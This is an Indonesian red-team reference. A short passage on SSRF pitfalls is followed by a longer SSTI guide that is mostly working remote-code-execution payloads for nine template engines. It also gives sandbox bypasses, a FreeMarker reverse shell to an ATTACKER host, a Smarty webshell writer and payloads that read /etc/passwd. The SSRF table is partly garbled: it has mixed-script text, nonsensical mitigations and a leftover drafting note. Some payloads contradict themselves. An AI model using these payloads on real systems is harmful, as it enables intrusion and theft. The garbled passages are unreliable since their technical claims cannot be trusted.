Jika fetcher mengikuti DNS: interaksi DNS + HTTP terlihat di Burp Collaborator / interactsh (oob-dns). Teknik exfil via DNS untuk hasil GET responsif tidak muncul — gunakan prepend-as-subdomain sebagai konfirmasi ekspresif per endpoint, kecuali resolver internal jelas mentranslate; ini bukan tagihan.

Payload `interactsh`:
```bash
./interactsh-client -n oob.redteam.internal -v
# annotasi session di terminologi
```

## 5. Jebakan Operasional

| Jebakan | Simptom | Mitigasi |
|---|---|---|
| Struktur λ gagal resolve notasi desimal/hex | `2852039166` return ef-`-1` navigation atau error `no such host` | glibc convert kini tidak berlaku; HTTPS ini buruk — kebanyakan CPU digit resolve hello masihไฮ certain `minister`. |

Mari tulis tabel jebakan yang presisi:

| # | Jebakan | Kenapa teknik gagal | Mitigasi praktis |
|---|---|---|---|
| 1 | **Disallow list 169.254** di WAF/network ACL level (bukan app) | endpoint IMDS tidak reluaskan sources di VPC123 | dari RBAC network non-switch |
| 2 | **IMDSv2 required** | semua GET quert tanpa token return 404/405; tool SSRF otomatis biasanya hanya tembakan GET | baca apakah target dijunk |

Hentikan draft — tulis ulang final tabel di bawah.

## 5. Jebakan Operasional (Penyebab Gagal di Lapangan)

| # | Jebakan | Gejala | Mitigasi |
|---|---|---|---|
| 1 | **IMDSv2 enforced** (`HttpTokens=required`) — paling umum di AWS akun-akun modern (2024+) | semua GET ke `169.254.169.254/latest/meta-data/` return `404`/`401` tanpa token | tool SSRF app jarang dukung PUT + header custom. Cek apakah request method dipassthrough; jika hanya GET → percuma kecuali ada CRLF injection di request line |
| 2 | **IMDSv2 hop limit = 1** (default) | token valid tapi fetch melalui LB/proxy hop ke-2 → timeout/`502` | jumlah hop: client → app (1) → app fetch itself = aman; via reverse proxy berarti hop sudah terpakai → hop limit harus naik. Kalau fix hop limit hanya bisa di kontrol AWS akun, ini dinding nyata |
| 3 | **Containers podded** dengan network `hostNetwork: false` | `169.254.169.254` di container AWS EKS/ECS merujuk EC2 host metadata — AKS beda pula | container metadata service beda endpoint (`169.254.170.2` untuk ECS task role); kalau container roles (IRSA) — metadata tidak memuat role sama sekali, token ada via projected volume → SSRF metadata basi |
| 4 | **Filter di resolver, bukan di app** (DNS sinkhole ke `169.254.169.254`, literal `127.0.0.1` blocked via firewall tepi) | port scan internal selalu timeout ulang dengan improvise same signature `producing uniform tidak berbeda` | Timing oracle bias; posting tong stick `middle graphic resolution` berubah pola | juga menandai semua OOB DNS tidak komukasiing jaringan egress 53 dari subnet | gunakan exfil via HTTP callback |
| 5 | **requests/Go client menolak redirect ke skema non-HTTP** (`allow_gopher`), dan partner menolak IP literal 169.254 di `Location` | 302 `gopher://` tidak diikuti karena `curl` / `requests` menolak cross-scheme | pastikan library fetcher `Naive custom` Client `transport` custom - sektor responsif uji via internal `frontend` |
| 6 | **pipelining internal app berada di belakang sidecar (Istio/Envoy, nginx 1.25 sebagai sidecar)** | responder reverse proxy mengirim `X-Forwarded-Host` atau langsung menutup koneksi; gopher command tidak mencapai service, di rewrite via `proxy_pass` http-only | uji fingerprint langsung: `curl -v http://app.example.com/fetch?url=http://127.0.0.1:6379/x%0d%0aPING%0d%0a` ; response `-ERR` vs `400` berbedam |
| 7 | **WAF players (Cloudflare) deteksi payload SSRF umum (`169.254.169.254` literal)** | 403 di request pertama, sebelum berlaku | notasi alternatif & nip.io hash unik adalah kunci; DNS rebinding perlu custom domain — outbound DNS di WAF-edge consumer juga kadang dilewati |
| 8 | **Egress policy / Security Group tidak mengizinkan outbound dari SSRF point ke 169.254** jaringan internal | seluruh notasi identik — semua gagal karena jaringan physical tidak lulus | ini tidak bisa dibypass dari app层的; hanyaweis workaround jaringan (rebinding tidak membantu; IP ternormalisasi identik) |
| 9 | **Blind SSRF via timing noisy** karena jitter jaringan 50-800ms | hasil tak konsisten antar-run | gunakan median N=10 permintaan; kalau RST vs SYN-ACK terlihat stabile di 2 kelompok jelas → valid; kalau overlap → jangan baca book |
| 10 | **GCP header requirement (`Metadata-Flavor: Google`) diinjectasi via parameter DNS hierarchi tapi fetcher strip header custom** | `403` konsistency | hanya dapat bypass jika fetcher forward arbitrary header (test manual `?url=http://metadata.google.internal/&methodHeader=true`) atau CRLF injection |


## ssti

# ssti — web

# SSTI: Referensi Teknis Red Team

## 1. Konsep Dasar

SSTI terjadi saat input user dievaluasi oleh template engine **sebelum atau sesudah** dirender, bukan sekadar di-escape. Bedanya dengan XSS server-side: pada XSS, input diproses sebagai *data*; pada SSTI, input diproses sebagai *kode template* yang dieksekusi di server.

**Kejut awal**: bug SSTI langsung berujung RCE pada mayoritas engine yang tidak disandbox. Ini bukan bug "cosmetic".

---

## 2. Deteksi & Membuktikan SSTI vs XSS

### 2.1 Probe Poliglot

Kirim string ini di setiap parameter yang reflected/rendered:

```
${{<%[%'"}}%\.
```

**Interpretasi respons:**

| Output / Error | Kesimpulan |
|---|---|
| `${{<%[%'"}}` utuh | Tidak ada SSTI (plain render atau XSS-only) |
| Error template (mis. `com.mitchellbosecke.pebble.error.PebbleException`) | SSTI — engine bocor dari stack trace (Pebble) |
| `${...}` hilang, sisanya muncul | Kemungkinan SSTI di Java (FreeMarker/Velocity/Thymeleaf) |
| `{{`→evaluated | Jinja2/Twig/similar |
| Halaman sebagian hilang/rusak | Template parsing aktif, payload menggangkup sintaks |

### 2.2 Matriks Probe Default per Bahasa

Kirim semua sekaligus (dipisah per parameter atau per request):

```
{{7*7}}
${7*7}
<%= 7*7 %>
<# 7*7 #>
#{7*7}
${{7*7}}
#{7*7}
*{7*7}
@{(7*7).toString}
{{7*'7'}}
```

**Interpretasi hasil `7*7`:**

| Output | Engine |
|---|---|
| `49` | Jinja2, Twig (Python/PHP — arbitrary math works) |
| `7777777` | Jinja2 (string multiplication `7*'7'`) |
| `{{7*7}}` utuh | Bukan SSTI di engine itu — coba probe lain |
| `49` dari `<%= 7*7 %>` | ERB (Ruby) |
| `49` dari `<# 7*7 #>` | FreeMarker |
| `49` dari `#{7*7}` | Thymeleaf (preprocessing), Ruby interpolation |
| `49` dari `${7*7}` | FreeMarker, Velocity, Thymeleaf (globals), Freemarker legacy |
| `7777777` dari `${7*'7'}` | Jinja2-like via `${}` di beberapa engine (tidak umum) |

### 2.3 Perbedaan Jinja2 vs Twig (keduanya `{{7*7}}` = 49)

```
{{7*'7'}}
```
- Jinja2 → `7777777` (Python `int*str` = repetition)
- Twig → `49` (PHP `"7"*7` = aritmetika string) **dan** error/`0` tidak muncul. Twig mengevaluasi `'7'*7` secara numerik.

Konfirmasi kedua:

| Payload | Jinja2 | Twig |
|---|---|---|
| `{{_self.env.display("x")}}` | — | Deprecated Twig 1.x, mati di Twig 2+/3 |
| `{{self}}` | `<TemplateReference None>` | Objek Twig template |
| `{{[]}}` (list render) | `[]` | error array-to-string |
| `{{dump(app)}}` | — | Twig (Symfony aware) |

### 2.4 Distinguishing SSTI dari Server-Side XSS

Uji deterministik:

| Kirim | SSTI muncul sebagai | XSS-only muncul sebagai |
|---|---|---|
| `{{7*7}}` | `49` | `{{7*7}}` literal |
| `${7*7}` diisi ke parameter | `49` | `${7*7}` literal |
| `<%= 7*7 %>` dalam "halaman email" (mail merge) error path | `49` | literal |
| Payload di parameter **yang tidak dirender ke HTML** (mis. nama file yang dikirim via email, PDF render) | nilai ter-eval muncul di artefak | payload literal |

**Kunci**: XSS-only membutuhkan eksekusi di browser engine (Chrome 131, dst). SSTI bisa dibuktikan tanpa browser — output dievaluasi di server, verifikasi via HTTP response, email, PDF, atau log.

**Kasus ambigu**: user-provided template (feature legitimate). Contoh: fitur "custom email template" di SaaS. Ini bukan inject-by-mistake tapi *trusting user as template author* — impact tetap RCE jika engine tidak sandboxed.

---

## 3. Peta Engine

| Engine | Bahasa | Sintaks | Sandbox Default | RCE Vector Utama |
|---|---|---|---|---|
| Jinja2 | Python | `{{ }}`, `{% %}` | Tidak, tapi autoescape HTML on | `__mro__`/`__subclasses__` chain |
| Twig | PHP | `{{ }}`, `{% %}` | `(sandbox: Twig\Integration\Sandbox)` off by default | `{{['id']|map('system')}}`, filter 'escape' custom |
| FreeMarker | Java | `<#>`, `${}` | `<#ftl>` + `Configuration.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER)` — off by default | `.new()` via `?new`, `freemarker.template.utility.Execute` |
| Velocity | Java | `#set`, `${}` | SecureUberspector off by default | `$class.getClass().forName(...)` reflection |
| Smarty | PHP | `{ }`, `{$var}` | `$smarty->security` off by default | `{Smarty_Internal_Write_File::writeFile(...)}`, `system` via tag |
| Pebble | Java | `{{ }}`, `{% %}` | Off by default | `{{variable.getClass().forName(...).getMethod(...)}}` |
| ERB (Rails) | Ruby | `<%= %>`, `<% %>` | ERB sendiri tidak; whitelisting via ActiveSupport on escape | `class_eval` via `<%= %>` access — akses object graph `self` |
| Handlebars (JS) | JavaScript | `{{ }}`, `{{#if}}` | Meta-programming via `constructor` reachable | `{{#with "toString" as |str|}}{{lookup this str}}{{/with}}` block exploit |
| Thymeleaf (Spring) | Java | `th:*`, `${}`, *expression `${'...'}` fragment | Tidak (SpringEL evaluator) | `${T(java.lang.Runtime).getRuntime().exec('id')}` via preprocessing `__${...}__` |

---

## 4. Payload RCE per Engine

### 4.1 Jinja2 (Flask, MkDocs, Ansible, Paging plugins)

**Recon object chain (kirim per parameter, konsistensi output di halaman):**

```
{{ ''.__class__.__mro__ }}
```
Output: `(<class 'str'>, <class 'object'>)` → Jinja2 terkonfirmasi.

**Cari file-oriented/os._wrap_close/subprocess.Popen object:**

```
{{ ''.__class__.__mro__[1].__subclasses__() }}
```
Output: daftar semua class, panjang ribuan. Cari index:

```
{{ ''.__class__.__mro__[1].__subclasses__() | map('string') | join(', ') }}
```
Cari `subprocess.Popen` (Python 3.x umumnya di sekitar index 200–400, jar fixed: gunakan enumerate).

**RCE deterministik:**

```
{{ ''.__class__.__mro__[1].__subclasses__()[INDEX]('id', shell=True, capture_output=True).stdout }}
```
Iterasi via Python side-script untuk menemukan INDEX di target versi.

**Verifikasi output**: `uid=0(root)` muncul respons → RCE pasti.

**Kenapa gagal**: template hanya menerima string (blacklist filter di server, misy `__class__` di-blok). Bypass: gunakan karakter escape + filter `attr()`:

```
{{ ''|attr(request.args.f|urlencode) }}
```
Dengan `?f=__class__` — filter miss karena payload tidak literal `__class__`.

**Bypass sandbox Jinja2 SandboxedEnvironment** (mis. di app yang pakai `SandboxedEnvironment`):
- Sandbox filter `attr`, `map`, `join` — tapi **tidak** blok `int|string`-to-`__globals__` kombinasi di Jinja2 < 2.11.1 full. Jinja2 >= 2.11.1 patch escape via `|attr()` trapdoor.
- Payload known bypass (Jinja 2.10.x):
```
{{ request|attr("application")|attr("\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f")|attr("\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f")("__builtins__")|attr("\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f")("\x65\x76\x61\x6c") }}(...)
```

**Kenapa berhasil**: `\x5f` = `_` hex-escape, filter regex-blacklist `__` tidak match.

---

### 4.2 Twig (PHP, prevalen di Drupal < 8.x pinned, Laravel Blade bukan Twig — hati-hati)

Twig versi **1.x** (masih common di legacy Drupal, Email module prestashop ≥1.7):

```
{{_self.env.display("{{['id']|map('system')}}")}}
{{_self.env.display("<?php system('id'); ?>")}}
```

Twig **2.x/3.x**: `_self.env` deprecated. Gunakan filter `map` + callable injection:

```
{{['id']|map('system')}}
```
Output: `uid=...` array-rendered.

Alternatif jika `map` disabled:

```
{{ [0,0]|reduce("system", "id") }}
```
Twig 3: `map` calls callback per-element; `system` adalah fungsi PHP global, jadi callable injection langsung.

**Kenapa gagal**: PHP `system` di-disable php.ini `disable_functions`. Bypass: gunakan `file_put_contents`:

```
{{ ['x.php','<?php echo "pwn"; ?>']|map('file_put_contents') }}
```

**Kenapa gagal #2**: Twig sandbox aktif. Bypass—sandbox Twig (class `Twig\Sandbox\SecurityPolicy`) allowlist function; tapi *filter escape* default STDOUT `system` tidak diallow. try callback via custom filter if any.

---

### 4.3 FreeMarker (Java, digunakan Alfresco, Liferay, banyak CMS Java EE)

**Test:**
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

**FreeMarker ≥ 2.3.30** — `.new()` diblokage default (`?new` deprecated untuk non-template class):

Bypass:
```
<#assign ex="freemarker.template.utility.Execute"?new()>
```
→ error `Instantiating freemarker.template.utility.Execute is not allowed in the template for backward compatibility`.

Workaround multi-step (dikenal di >= 2.3.30 masih feasible di default config yang **tidak** set `Configuration.setNewBuiltinClassResolver`):

```
<#assign obj="freemarker.template.utility.ObjectConstructor"?new()>
${obj("freemarker.template.utility.ClassUtil")}
```

Alternative breadcrumb (Jython exec di env yang punya Jython):
```
<#assign value="freemarker.template.utility.Execute"?new()>${value("bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'")}
```

Output: `uid=...` reflected. **Kenapa berhasil**: `Execute` execute command via `Runtime.exec` di JVM process.

**Bypass sandbox jika `TemplateClassResolver.SAFER_RESOLVER` aktif**: tidak bisa instantiate arbitrary class — fallback ke:
```
${.getWeapon?}
```
Tidak ada. Coba:
```
<#assign uri = .data_model?values?first>
```
— dump data_model untuk leak secret (file read, config) sebagai fallback post-exploit.

---

### 4.4 Velocity (Java, prevalen di Confluence < server-side template custom script — Confluence 5.x–7.x tertentu, solr config)

```
#set($e="exp")
#set($a=$e.class.forName("java.lang.Runtime"))
#set($b=$a.getRuntime().exec("id"))
```
Output: object `java.lang.Process` — untuk render stdout gunakan:

```
#set($out=$b.getInputStream())
#set($read=$out.read())
```
(complex; commonly via `ProcessBuilder` + read loop, atau one-liner exec blind via reverse shell `curl`).

**Pre-canonical Confluence CVE-2019-3396 style** — variant widget connector.

**Bypass SecureUberspector**: bloquea `class` methode access. Known trick: access via `java.lang.Class` through different object graph (`$request.getClass()` vs `$class.getClass()`).

### 4.5 Smarty (PHP, Common di PrestaShop hooks, forum legacy)

```
{system('id')}
```
Output: `uid=` — Smarty konfig `security=false` mengizinkan PHP function sebagai tag.

Fallback jika `{system}` di-blok oleh `$security`:
```
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```
Ini menulis webshell ke file template yang sedang render — output: subsequent request `?cmd=id` → `uid=...`.

**Kenapa gagal**: nginx 1.25 + PHP-FPM config — file ditulis dengan user `www-data` tapi directory `/templates_c` `deny all;`. Workaround: tulis ke `/public/uploads/` jika user punya write, atau gunakan `mail()` untuk exfil sebagai yang path arbitrary.
```
{system('find / -writable -type d 2>/dev/null')}
```
dulu.

### 4.6 Pebble (Java, Spring Boot application yang pakai `spring-boot-starter-pebble`)

**Rekon:**
```
{{variable}}
```
→ jika Pebble, `{{com.mitchellbosecke.pebble.error.PebbleException}}` muncul untuk syntax invalid (mis. `{{{{{}}}}}`).

**RCE:**
```
{% set cmd = "id" %}
{% set bytes = "freemarker.template.utility.Execute"?new %}
```
( **tidak** — Pebble bukan FreeMarker.)

Pebble correct payload:
```
{% set cl = java.lang.Class.forName("java.lang.Runtime") %}
```
Pebble **versi 3.x sebelum 3.1.5** vulnerable via `getClass().forName()` chain (CVE-2021-42550 analog; fixed 3.1.5 dengan default disallow `getClass()`):

```
{{ variable.getClass().getDeclaredMethod("getRuntime").invoke(null).exec("id") }}
```

Versi fix 3.1.5+ blok `getClass()` reflection. Bypass (opsional enum pada custom extension):
```
{# comment #}
```
kosong — tidak aktif; Pebble tidak punya breadcrumb jika sandbox aktif default 3.1.5+; fall back ke **data exposure**:
```
{{ environment }}
```
leak context.

### 4.7 ERB (Ruby on Rails, mailer templates, custom reporting)

Rails mem-pipe template via ERB ke view. Untuk user-supplied template (misy via `ERB.new(params[:template]).result(binding)`):

**Confirm:**
```
<%= 7*7 %>
```
Output: `49`.

**Recon:**
```
<%= self %>
```
→ object context / template binding bocor.

**RCE deterministik (tanpa OS command, via Ruby `system`):**
```
<%= system("id") %>
```
Output: `uid=...` pada stdout captured.

Alternatif in-band:
```
<%= `id` %>
```
Output direct string return dari backtick (kernel ` operator).

**Kenapa gagal**: Rails row "template" via ActionView `render inline` — `system` tersedia dalam `Object.new` binding, tapi jika multi-tenant template dikirim via `Rails::OutputSafety`/liquid. **Liquid** adalah templating yang disandbox by design — ERB ≠ Liquid; cek via tag `{{ }}` vs `<%= %>` — jika hanya `{{ }}` → Liquid — tidak bisa ERB payload.

Bypass sandbox Liquid (jika perlu, advanced): via `resource_assigns` / custom `Liquid::Block` tag plugins, jangan via template string biasa.

---

### 4.8 Handlebars (JavaScript, Node.js/Express, client & server)

Handlebars di **server-side** (Express view engine). Key: template compiler — jika input yang dikirim diteruskan sebagai **template string** (bukan compiled `render(data)`):

**Via template string injection:**
```
{{#with "constructor" as |c|}}{{lookup this c}}{{/with}}
# atau
{{constructor.constructor('return process')()}}
```

PoC known (handlebars.js ≤ 4.7.7 compiled runtime sandbox escape — CVE-2019-19920 related series untuk `constructor`-based escape):

```
{{#blockHelperMissing}}7*7{{/blockHelperMissing}}
{{"constructor".constructor}}
```

Full:
```
{{#with "s" as |obj|}}...{{/with}}{{obj.constructor.constructor("return this")()}}
```

Perlu diingat: Handlebars sandbox escape **hanya berlaku jika** user template dipakai `Handlebars.compile(user_input)` — klasik di CMS via form "custom report".

Output: jika payload simple `{{constructor.constructor}}` render string function body → engine bocor.

**Kenapa gagal**: `compile` called dengan `noEscape:true` off vs `strict` — bukan sandbox inti. Jika app pakai precompiled template JS di browser — ini **client-side only** → handlebars injection = XSS, bukan SSTI server. Distinguish via response timing server-side (eval error in `server.log`).

---

### 4.9 Thymeleaf (Java, Spring Boot — sangat umum di enterprise)

**Recon (preprocessing exploit):**

Thymeleaf 3.x preprocessing `__${...}__` evaluated **didalam** expression:

```
__${T(java.lang.Runtime).getRuntime().exec("id")}__::x
```

Klasik (Thymeleaf view-name / fragment reflection injection pada Spring Boot):

URL:
```
GET /path?section=__${T(java.lang.Runtime).getRuntime().exec(new String[]{"bash","-c","id > /tmp/pwn"})}__::.x
```
pada routing `return "path::" + section;` → fragment expression injection.

**Output**: blind RCE — verifikasi via `/tmp/pwn` atau out-band. Untuk in-band:

```
[[${T(java.lang.Runtime).getRuntime().exec("id")}]]
```
Output render: `java.lang.ProcessImpl@hash` → eksekusi terjadi.

In-band stdout (multi) — Space trim trick:
```
[[${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}]]
```

**Footer note**: `T()` expressions disabled oleh `SpringWebFluxConversionService` custom `SPEL` — muitas enterprise default aktif. Evaluated via `${}` pada attribute `th:text`:

```
<p th:text="${7*7}"></p>
```
Jika user input viabilis into `th:text` attribute value — SpringEL jalan → full RCE identical Spring4Shell style.

## 6. File Read

| Engine | Payload | Output |
|---|---|---|
| Jinja2 | `{{ get_file_contents('/etc/passwd') }}` (PHP-only!) — actual Jinja equivalent | — perlu OS command; gunakan `{{ ''.__class__...('cat /etc/passwd',shell=True).stdout }}` |
| Twig (PHP) | `{{['cat /etc/passwd']|map('system')}}` | isi passwd |
| Smarty | `{system('cat /etc/passwd')}` | passwd |
| FreeMarker | `<#assign fl=exec("cat /etc/passwd")>` via Execute object atau `<#include "/etc/passwd">` | error parse tapi read jika plain include |
| Velocity | `#include("/etc/passwd")` — raw include (does not evaluate) | passwd literal |
| ERB | `<%= File.read('/etc/passwd') %>` | passwd |
| Thymeleaf (Linux) | via `new java.util.Scanner(...exec("cat /etc/passwd")...)` (payload di section 4.9) | passwd |
| Handlebars (Node) | `{{constructor.constructor("return require('fs').readFileSync('/etc/passwd').toString()")()}}` jika require bisa diakses — sering gagal; common fallback escape via `process.mainModule` (Node < 14 saja) | passwd |
| Pebble (pre-3.1.5) | `{% set bytes = ...exec("cat /etc/passwd") %}` complex stdout read; simpler blind write | write `cp /etc/passwd publoc` ext |

**Windows target** (Windows 11 24H2 server):
- Jinja: `{{ ''.__class__.__mro__[1].__subclasses__()[INDEX]('type C:\\Users\\Public\\flag.txt', shell=True).stdout }}` — sesuai index `subprocess.Popen` di target Python (misy Python 3.11: index ~ 271–416 varian; enumerasi dulu).
- Thymeleaf: recalibrate command `cmd /c type C:\Users\Public\flag.txt`.
